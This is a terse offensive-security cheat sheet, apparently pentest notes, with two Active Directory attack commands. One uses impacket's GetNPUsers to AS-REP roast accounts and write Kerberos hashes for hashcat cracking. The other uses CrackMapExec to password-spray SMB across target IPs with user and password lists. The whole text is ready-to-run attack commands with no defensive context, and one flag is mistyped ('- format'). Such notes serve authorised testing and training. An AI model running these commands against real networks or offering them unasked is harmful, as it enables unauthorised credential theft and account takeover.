
```
#AS-REP Roast
impacket-GetNPUsers.py <domain>/ -usersfile <usernames.txt> - format hashcat -outputfile <hashes.txt>

#Password Spray
crackmapexec smb <target_ips> -u <user_list> -p <pass_list> -d <domain> --continue-on-success
```